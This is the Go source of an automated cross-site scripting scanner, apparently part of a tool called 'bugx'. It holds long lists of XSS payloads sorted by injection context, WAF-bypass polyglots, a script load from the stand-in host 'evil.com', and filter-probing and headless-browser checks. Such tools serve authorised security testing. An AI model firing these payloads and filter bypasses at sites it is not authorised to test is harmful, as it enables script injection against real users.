package scanner

import (
	"bugx/pkg/utils"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
)

type XSSScanner struct{}

// XSS context types - like XSSStrike's context analysis
type XSSContext int

const (
	ContextHTML      XSSContext = iota // Between HTML tags
	ContextAttribute                   // Inside attribute value
	ContextScript                      // Inside script tag
	ContextURL                         // Inside href/src attributes
	ContextEvent                       // Inside event handler
	ContextComment                     // Inside HTML comment
	ContextUnknown                     // Unknown context
)

// generateCanaryToken creates a unique token for XSS verification
func generateCanaryToken() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return "xss" + hex.EncodeToString(bytes)
}

// XSS payloads categorized by context - inspired by XSSStrike/Dalfox
// Each category targets specific injection points
var xssPayloadsByContext = map[XSSContext][]string{
	// HTML Context - payload between tags
	ContextHTML: {
		`<script>alert('CANARY')</script>`,
		`<img src=x onerror="alert('CANARY')">`,
		`<svg onload="alert('CANARY')">`,
		`<body onload="alert('CANARY')">`,
		`<input onfocus="alert('CANARY')" autofocus>`,
		`<marquee onstart="alert('CANARY')">`,
		`<video><source onerror="alert('CANARY')">`,
		`<details open ontoggle="alert('CANARY')">`,
		`<audio src=x onerror="alert('CANARY')">`,
		`<object data="javascript:alert('CANARY')">`,
		`<iframe src="javascript:alert('CANARY')">`,
		`<embed src="javascript:alert('CANARY')">`,
		`<math><maction actiontype="toggle"><mi>x</mi></maction></math><script>alert('CANARY')</script>`,
		`<svg><animate onbegin="alert('CANARY')">`,
		`<svg><set onbegin="alert('CANARY')">`,
		`<isindex type=image src=1 onerror="alert('CANARY')">`,
		`<form><button formaction="javascript:alert('CANARY')">X</button>`,
		`<xss onafterscriptexecute="alert('CANARY')"><script>1</script>`,
	},

	// Attribute breakout - when reflected inside attribute value
	ContextAttribute: {
		`"><script>alert('CANARY')</script>`,
		`"><img src=x onerror="alert('CANARY')">`,
		`"><svg onload="alert('CANARY')">`,
		`'><script>alert('CANARY')</script>`,
		`'><img src=x onerror="alert('CANARY')">`,
		`" autofocus onfocus="alert('CANARY')`,
		`' autofocus onfocus='alert(String.fromCharCode(67,65,78,65,82,89))`,
		`" onmouseover="alert('CANARY')" x="`,
		`' onmouseover='alert(&apos;CANARY&apos;)' x='`,
		`"><svg/onload=alert('CANARY')>`,
		`"><body onload=alert('CANARY')>`,
		`" onfocus="alert('CANARY')" autofocus tabindex=0 x="`,
		`"><input onfocus=alert('CANARY') autofocus>`,
		`"><details open ontoggle=alert('CANARY')>`,
		`" onpointerover="alert('CANARY')" x="`,
		`"><select autofocus onfocus=alert('CANARY')>`,
		`"><textarea autofocus onfocus=alert('CANARY')>`,
	},

	// Script context breakout
	ContextScript: {
		`</script><script>alert('CANARY')</script>`,
		`';alert('CANARY');//`,
		`";alert('CANARY');//`,
		`</script><img src=x onerror="alert('CANARY')">`,
		`'-alert('CANARY')-'`,
		`"-alert('CANARY')-"`,
		`\';alert(String.fromCharCode(67,65,78,65,82,89))//`,
		`\";alert(String.fromCharCode(67,65,78,65,82,89))//`,
		`</script><svg onload=alert('CANARY')>`,
		`1;alert('CANARY')`,
		`1%0aalert('CANARY')`,
	},

	// URL context (href, src, etc.)
	ContextURL: {
		`javascript:alert('CANARY')`,
		`data:text/html,<script>alert('CANARY')</script>`,
		`javascript:alert(String.fromCharCode(67,65,78,65,82,89))`,
		`//evil.com/xss.js?CANARY`,
		`java%0ascript:alert('CANARY')`,
		`java%09script:alert('CANARY')`,
		`java%0dscript:alert('CANARY')`,
		`&#106;avascript:alert('CANARY')`,
		`&#x6A;avascript:alert('CANARY')`,
	},

	// Event handler context
	ContextEvent: {
		`alert('CANARY')`,
		`alert(String.fromCharCode(67,65,78,65,82,89))`,
		`alert('CANARY');//`,
		`')alert('CANARY')//`,
		`");alert('CANARY');//`,
		`this.alert('CANARY')`,
		`(alert)('CANARY')`,
		`[].constructor.constructor('alert(\"CANARY\")')()`,
		`eval(atob('YWxlcnQoJ0NBTkFSWScpJw=='))`,
	},
}

// Universal payloads - work in multiple contexts (fallback)
var universalPayloads = []string{
	`"><script>alert('CANARY')</script>`,
	`'><script>alert('CANARY')</script>`,
	`<img src=x onerror=alert('CANARY')>`,
	`<svg/onload=alert('CANARY')>`,
	`"><img src=x onerror=alert('CANARY')>`,
	`'><img src=x onerror=alert('CANARY')>`,
	`"><svg/onload=alert('CANARY')>`,
	`<body onload=alert('CANARY')>`,
	`<input onfocus=alert('CANARY') autofocus>`,
	`<details open ontoggle=alert('CANARY')>`,
	// Polyglot payloads - work in multiple contexts
	`jaVasCript:/*-/*'/*\'/*"/**/(/* */oNcLiCk=alert('CANARY') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('CANARY')//>\x3e`,
	`'">><marquee><img src=x onerror=alert('CANARY')></marquee></textarea/</title/</style/</noscript/</xmp/</template/</script//-->&lt;svg/onload=alert('CANARY')>`,
	`<IMG SRC="javascript:alert('CANARY')">`,
	`<IMG SRC=javascript:alert(String.fromCharCode(67,65,78,65,82,89))>`,
	`<IMG """><SCRIPT>alert("CANARY")</SCRIPT>">`,
}

// WAF bypass payloads
var wafBypassPayloads = []string{
	// Polyglots from PwnXSS / Seclists
	`javascript://%250Aalert(1)//"/*\'/*/'/*--></SCRIPT><img/src=x onerror=alert(1)>`,
	`" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//`,
	`';alert(1)//`,
	`"><svg/onload=alert(1)>`,
	`<img src=x onerror=alert(1)>`,
	`<iframe src=javascript:alert(1)>`,
	`<svg/onload=alert(1)>`,
	`<x onclick=alert(1)>click this!`,
	`<a href="javascript:alert(1)">click me`,

	// Zeus-Scanner inspired bypasses
	`<ScRiPt>alert(1)</sCrIpT>`,
	`<script/x>alert(1)</script/x>`,
	`<h1/onclick=alert(1)>click me</h1>`,
	`"><svg/onload=confirm(1)>`,
	`"><img/src=x/onerror=prompt(1)>`,
	`javascript:confirm(1)`,
	`//www.google.com/../../javascript:alert(1)`,

	// XSS-LOADER style mutations
	`<img src=x onerror=alert(1)>`,
	`<img src=x onerror=alert&#40;1&#41;>`,
	`<svg><script>alert(1)</script>`,
	`"><input onfocus=alert(1) autofocus>`,
	`"><details ontoggle=alert(1) open>`,
	`"><select onchange=alert(1)>`,
	`<body onpageshow=alert(1)>`,
	`<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>`,
}

// DOM XSS sources and sinks for detection
var domXSSSources = []string{
	"location.hash",
	"location.search",
	"location.href",
	"document.URL",
	"document.documentURI",
	"document.referrer",
	"window.name",
	"document.cookie",
	"localStorage",
	"sessionStorage",
}

var domXSSSinks = []string{
	"document.write",
	"document.writeln",
	"innerHTML",
	"outerHTML",
	"insertAdjacentHTML",
	"eval(",
	"setTimeout(",
	"setInterval(",
	"Function(",
	"execScript(",
	".src",
	".href",
	".action",
	"location.href",
	"location.replace",
	"location.assign",
}

func (s *XSSScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting Advanced XSS Scan with Context Analysis..."))
	fmt.Println(utils.White("[*] Using XSSStrike/Dalfox-style detection"))
	fmt.Println(utils.White("[*] Context-aware payload selection enabled"))
	fmt.Println(utils.White("[*] Browser-based JavaScript execution verification\n"))

	// Create shared browser context with optimized options
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-web-security", true),
		chromedp.Flag("ignore-certificate-errors", true),
		chromedp.Flag("allow-running-insecure-content", true),
		chromedp.Flag("disable-background-networking", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-translate", true),
		chromedp.Flag("mute-audio", true),
		chromedp.WindowSize(1920, 1080),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	// Test if Chrome is available
	testCtx, testCancel := chromedp.NewContext(allocCtx)
	if err := chromedp.Run(testCtx, chromedp.Navigate("about:blank")); err != nil {
		testCancel()
		fmt.Println(utils.Red("[!] Chrome/Chromium not found. Please install Chrome for XSS scanning."))
		fmt.Println(utils.Yellow("[i] Install with: choco install googlechrome (Windows) or apt install chromium-browser (Linux)"))
		return nil
	}
	testCancel()

	for _, baseURL := range config.URLs {
		// Step 1: Get baseline response for context analysis
		baseResp, err := utils.MakeRequest(baseURL, config.Cookie, config.Timeout)
		if err != nil {
			fmt.Printf("%s Cannot reach: %s\n", utils.Red("[!]"), baseURL)
			continue
		}

		// Step 2: Detect potential DOM XSS
		domXSSFound := detectDOMXSSPatterns(baseResp.Body)
		if len(domXSSFound) > 0 {
			fmt.Printf("%s Potential DOM XSS patterns found in: %s\n", utils.Yellow("[!]"), truncateURL(baseURL, 60))
			for _, pattern := range domXSSFound {
				fmt.Printf("    %s %s\n", utils.Cyan("→"), pattern)
			}
		}

		// Step 3: Extract all parameters from URL
		params := extractAllParams(baseURL)
		if len(params) == 0 {
			// No parameters, try appending payload to URL
			params = []string{""}
		}

		// Step 4: Test each parameter with context-aware payloads
		for _, paramName := range params {
			wg.Add(1)
			sem <- struct{}{}
			go func(baseURL, paramName string, baseResp utils.RequestResponse) {
				defer wg.Done()
				defer func() { <-sem }()

				results := testParameterForXSS(allocCtx, baseURL, paramName, baseResp, config)
				for _, result := range results {
					processor.Add(result)
				}
			}(baseURL, paramName, baseResp)
		}
	}

	wg.Wait()
	printXSSSummary(processor.Results)
	return processor.Results
}

// extractAllParams extracts all parameter names from URL
func extractAllParams(rawURL string) []string {
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	params := []string{}
	for key := range parsedURL.Query() {
		params = append(params, key)
	}
	return params
}

// testParameterForXSS tests a single parameter with context-aware payloads
func testParameterForXSS(allocCtx context.Context, baseURL, paramName string, baseResp utils.RequestResponse, config ScanConfig) []ScanResult {
	var results []ScanResult
	canary := generateCanaryToken()

	// First, inject canary to detect reflection context
	testURL := injectPayload(baseURL, paramName, canary)
	resp, err := utils.MakeRequest(testURL, config.Cookie, config.Timeout)
	if err != nil {
		return nil
	}

	// Check if canary is reflected
	if !strings.Contains(resp.Body, canary) {
		return nil // Not reflected, skip
	}

	// Analyze context where canary is reflected
	contexts := analyzeReflectionContext(resp.Body, canary)
	if len(contexts) == 0 {
		contexts = []XSSContext{ContextUnknown}
	}

	fmt.Printf("%s Parameter '%s' reflects input in %d context(s) - Probing filters...\n",
		utils.Yellow("[*]"), paramName, len(contexts))

	// PwnXSS Logic: Probe for allowed characters first
	allowedChars := checkSanitization(baseURL, paramName, config.Cookie, config.Timeout)

	// Log what we found
	var allowedStr []string
	for k, v := range allowedChars {
		if v {
			allowedStr = append(allowedStr, k)
		}
	}
	if len(allowedStr) > 0 {
		fmt.Printf("    %s Allowed Chars: %s\n", utils.Green("→"), strings.Join(allowedStr, " "))
	} else {
		fmt.Printf("    %s No special characters reflected raw (Strong filters detected)\n", utils.Yellow("→"))
		// Even if strong filters, we try generic polyglots as a hail mary
	}

	// Collect all payloads to test based on detected contexts AND allowed characters
	payloadsToTest := getPayloadsForContexts(contexts, allowedChars)

	// Add universal and WAF bypass payloads (filtered by allowed chars)
	for _, p := range universalPayloads {
		if isPayloadViable(p, allowedChars) {
			payloadsToTest = append(payloadsToTest, p)
		}
	}

	// Add WAF bypass payloads - helpful if simple chars are blocked but complex logic isn't
	// We're a bit more lenient here to allow for obfuscations
	payloadsToTest = append(payloadsToTest, wafBypassPayloads...)

	// Add user custom payloads if provided
	if len(config.Payloads) > 0 {
		payloadsToTest = append(payloadsToTest, config.Payloads...)
	}

	// Remove duplicates
	payloadsToTest = uniquePayloads(payloadsToTest)

	// Test each payload
	for _, payload := range payloadsToTest {
		uniqueCanary := generateCanaryToken()
		testPayload := strings.ReplaceAll(payload, "CANARY", uniqueCanary)

		targetURL := injectPayload(baseURL, paramName, testPayload)

		// First check if payload is reflected
		resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
		if err != nil {
			continue
		}

		// Check if canary is in response (payload reflected)
		if !strings.Contains(resp.Body, uniqueCanary) {
			continue
		}

		// Verify with browser - this is the definitive test
		confirmed, details := verifyXSSWithDialogInterception(allocCtx, targetURL, uniqueCanary, config.Timeout)

		if confirmed {
			fmt.Printf("%s %s\n",
				utils.Red("[✓] XSS CONFIRMED:"),
				utils.Cyan(truncateURL(targetURL, 80)))
			fmt.Printf("    %s %s\n",
				utils.Green("→"),
				utils.White(details))
			fmt.Printf("    %s Parameter: %s\n",
				utils.Green("→"),
				utils.White(paramName))

			results = append(results, ScanResult{
				URL:          targetURL,
				Vulnerable:   true,
				Payload:      testPayload,
				ResponseTime: resp.Duration,
				Details:      fmt.Sprintf("%s | Param: %s", details, paramName),
			})

			// Found XSS in this parameter, might want to continue testing for different contexts
			// but for efficiency, we can break after first confirmed
			break
		}
	}

	return results
}

// analyzeReflectionContext determines where the canary is reflected in the HTML
func analyzeReflectionContext(body, canary string) []XSSContext {
	var contexts []XSSContext
	contextMap := make(map[XSSContext]bool)

	lowerBody := strings.ToLower(body)
	lowerCanary := strings.ToLower(canary)

	// Find all occurrences
	idx := 0
	for {
		pos := strings.Index(lowerBody[idx:], lowerCanary)
		if pos == -1 {
			break
		}
		pos += idx

		// Analyze context at this position
		ctx := determineContext(body, pos)
		if !contextMap[ctx] {
			contextMap[ctx] = true
			contexts = append(contexts, ctx)
		}

		idx = pos + len(canary)
	}

	return contexts
}

// determineContext analyzes surrounding HTML to determine injection context
func determineContext(body string, pos int) XSSContext {
	// Get surrounding content (500 chars before and after)
	start := pos - 500
	if start < 0 {
		start = 0
	}
	end := pos + 500
	if end > len(body) {
		end = len(body)
	}

	before := strings.ToLower(body[start:pos])
	after := strings.ToLower(body[pos:end])

	// Check for script context
	scriptOpenRe := regexp.MustCompile(`<script[^>]*>(?:[^<]|<(?!/script>))*$`)
	if scriptOpenRe.MatchString(before) {
		return ContextScript
	}

	// Check for HTML comment
	if strings.Contains(before, "<!--") && !strings.Contains(before[strings.LastIndex(before, "<!--"):], "-->") {
		return ContextComment
	}

	// Check for event handler context (inside onclick, onload, etc.)
	eventHandlerRe := regexp.MustCompile(`\son\w+\s*=\s*["']?[^"'>]*$`)
	if eventHandlerRe.MatchString(before) {
		return ContextEvent
	}

	// Check for URL context (href, src, action attributes)
	urlAttrRe := regexp.MustCompile(`(?:href|src|action|formaction|data|poster|codebase)\s*=\s*["']?[^"'>]*$`)
	if urlAttrRe.MatchString(before) {
		return ContextURL
	}

	// Check for attribute context
	attrRe := regexp.MustCompile(`<[^>]+\s+\w+\s*=\s*["'][^"']*$`)
	attrRe2 := regexp.MustCompile(`<[^>]+\s+\w+\s*=\s*[^"'\s>][^"'>]*$`)
	if attrRe.MatchString(before) || attrRe2.MatchString(before) {
		return ContextAttribute
	}

	// Check if we're inside a tag but not in an attribute
	tagOpenRe := regexp.MustCompile(`<[^>]*$`)
	if tagOpenRe.MatchString(before) && !strings.Contains(after, ">") {
		return ContextAttribute
	}

	// Default: HTML context (between tags)
	return ContextHTML
}

// getPayloadsForContexts returns appropriate payloads for detected contexts
// IMPROVED: Now uses PwnXSS-style logic to filter payloads based on allowed characters
func getPayloadsForContexts(contexts []XSSContext, allowedChars map[string]bool) []string {
	var payloads []string
	seen := make(map[string]bool)

	// Helper to check if payload is viable based on allowed chars
	isViable := func(p string) bool {
		// If payload needs < but < is filtered, skip it
		if strings.Contains(p, "<") && !allowedChars["<"] {
			return false
		}
		if strings.Contains(p, ">") && !allowedChars[">"] {
			return false
		}
		if strings.Contains(p, "'") && !allowedChars["'"] {
			return false
		}
		if strings.Contains(p, "\"") && !allowedChars["\""] {
			return false
		}
		return true
	}

	for _, ctx := range contexts {
		if ctxPayloads, ok := xssPayloadsByContext[ctx]; ok {
			for _, p := range ctxPayloads {
				// Only add if we haven't seen it AND it passes the character filter
				if !seen[p] && isViable(p) {
					payloads = append(payloads, p)
					seen[p] = true
				}
			}
		}
	}

	return payloads
}

// checkSanitization probes the parameter to see which special characters are reflected raw
// This is the core logic from PwnXSS/Zeus to identify the specific filter rules
func checkSanitization(baseURL, paramName, cookie string, timeout int) map[string]bool {
	// Probe contains common dangerous characters
	probe := "zXy'\"<>;:/"

	// Inject probe
	targetURL := injectPayload(baseURL, paramName, probe)
	resp, err := utils.MakeRequest(targetURL, cookie, timeout)
	if err != nil {
		return map[string]bool{}
	}

	allowed := make(map[string]bool)
	body := resp.Body

	// Check each character
	// If the character appears literally in the response, it's allowed (vulnerable point)
	if strings.Contains(body, "'") {
		allowed["'"] = true
	}
	if strings.Contains(body, "\"") {
		allowed["\""] = true
	}
	if strings.Contains(body, "<") {
		allowed["<"] = true
	}
	if strings.Contains(body, ">") {
		allowed[">"] = true
	}
	if strings.Contains(body, ";") {
		allowed[";"] = true
	}
	if strings.Contains(body, ":") {
		allowed[":"] = true
	}
	if strings.Contains(body, "/") {
		allowed["/"] = true
	}

	return allowed
}

// injectPayload injects payload into URL parameter
func injectPayload(rawURL, paramName, payload string) string {
	if paramName == "" {
		// No specific parameter, append to URL
		if strings.Contains(rawURL, "?") {
			return rawURL + "&xss=" + url.QueryEscape(payload)
		}
		return rawURL + "?xss=" + url.QueryEscape(payload)
	}

	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}

	query := parsedURL.Query()
	query.Set(paramName, payload)
	parsedURL.RawQuery = query.Encode()

	return parsedURL.String()
}

// detectDOMXSSPatterns scans response body for potential DOM XSS patterns
func detectDOMXSSPatterns(body string) []string {
	var found []string

	// Check for dangerous source -> sink combinations
	for _, source := range domXSSSources {
		if strings.Contains(body, source) {
			for _, sink := range domXSSSinks {
				if strings.Contains(body, sink) {
					pattern := fmt.Sprintf("Potential DOM XSS: %s → %s", source, sink)
					found = append(found, pattern)
					break
				}
			}
		}
	}

	return found
}

// verifyXSSWithDialogInterception uses Chrome's dialog event to confirm XSS
// STRICT MODE: Only confirms if our unique canary is in the dialog message
func verifyXSSWithDialogInterception(allocCtx context.Context, targetURL, canary string, timeout int) (bool, string) {
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	// Increased timeout for better detection
	ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout+15)*time.Second)
	defer cancel()

	dialogDetected := false
	dialogMessage := ""
	dialogType := ""
	var dialogMu sync.Mutex

	// Listen for JavaScript dialog events (alert, confirm, prompt)
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch e := ev.(type) {
		case *page.EventJavascriptDialogOpening:
			dialogMu.Lock()
			dialogDetected = true
			dialogMessage = e.Message
			dialogType = string(e.Type)
			dialogMu.Unlock()
			// Dismiss the dialog to continue
			go func() {
				_ = chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
			}()
		}
	})

	// Navigate and wait for potential dialog
	err := chromedp.Run(ctx,
		chromedp.Navigate(targetURL),
		chromedp.Sleep(3*time.Second), // Increased to 3s for better detection
	)

	if err != nil && !strings.Contains(err.Error(), "context deadline") {
		// Some errors are expected
	}

	// Wait a bit more for delayed XSS triggers
	time.Sleep(500 * time.Millisecond)

	dialogMu.Lock()
	defer dialogMu.Unlock()

	if dialogDetected {
		// STRICT CHECK: Dialog message MUST contain our canary
		if strings.Contains(dialogMessage, canary) {
			return true, fmt.Sprintf("JavaScript %s() triggered with canary: %s", dialogType, canary)
		}
		// Also check without quotes (some payloads may modify the string)
		canaryNoQuotes := strings.ReplaceAll(canary, "'", "")
		if strings.Contains(dialogMessage, canaryNoQuotes) {
			return true, fmt.Sprintf("JavaScript %s() triggered with canary (no quotes): %s", dialogType, canary)
		}
	}

	return false, ""
}

// uniquePayloads removes duplicate payloads
func uniquePayloads(payloads []string) []string {
	seen := make(map[string]bool)
	var unique []string
	for _, p := range payloads {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	return unique
}

func truncateURL(url string, maxLen int) string {
	if len(url) <= maxLen {
		return url
	}
	return url[:maxLen-3] + "..."
}

func printXSSSummary(results []ScanResult) {
	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("XSS Scan Summary (Context-Aware Analysis):"))
	fmt.Printf("  %s Confirmed XSS (JavaScript Executed): %d\n", utils.Red("●"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are 100% CONFIRMED - alert() was triggered!"))
		fmt.Println(utils.White("    Detection method: Browser-based JavaScript dialog interception (ZERO FALSE POSITIVES)"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No XSS vulnerabilities found that trigger JavaScript dialogs."))
		fmt.Println(utils.White("    Note: Some XSS may require user interaction or specific conditions."))
	}
}

// isPayloadViable checks if payload should be tested based on allowed characters
func isPayloadViable(p string, allowedChars map[string]bool) bool {
	// Logic: If a payload explicitly relies on a character that we KNOW is filtered, skip it.
	// Optimistic approach: If allowedChars is empty (probe failed or all filtered), we typically skip strict checks
	// BUT here we want to be smart.

	// If < and > are confirmed FILTERED, skip HTML injection
	if (strings.Contains(p, "<") && !allowedChars["<"]) || (strings.Contains(p, ">") && !allowedChars[">"]) {
		// Only skip if we detected SOME filters. If everything is false (maybe probe failed?), we might still try.
		// But in this logic, allowedChars contains ONLY what was reflected.
		// So if map is empty, NOTHING was reflected.
		return false
	}

	// If quotes are needed and filtered
	if strings.Contains(p, "'") && !allowedChars["'"] {
		return false
	}
	if strings.Contains(p, "\"") && !allowedChars["\""] {
		return false
	}

	return true
}
